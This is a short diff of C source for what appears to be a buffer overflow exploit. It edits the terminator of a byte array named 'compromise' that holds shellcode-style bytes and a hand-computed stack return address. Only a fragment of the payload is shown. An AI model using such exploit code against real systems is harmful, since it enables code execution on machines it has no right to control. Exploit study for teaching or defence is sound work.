@@ -129,7 +129,7 @@ char compromise[130] = {
 0xFF,0xFF,0xFF,0xFF,                                //             dd 0xffffffff
 0xAB,0xF7,0xFF,0xBF,                                // newAddr:    dd newAddr-start 
 // Return Address: SP - 4 - newAddr = 0xBFFFF810 - 0x04 - 0x61 = 0xBFFFF7AB
-'\n','\0'     
+'\n',0x0     
 };
 
 char * compromise1 =
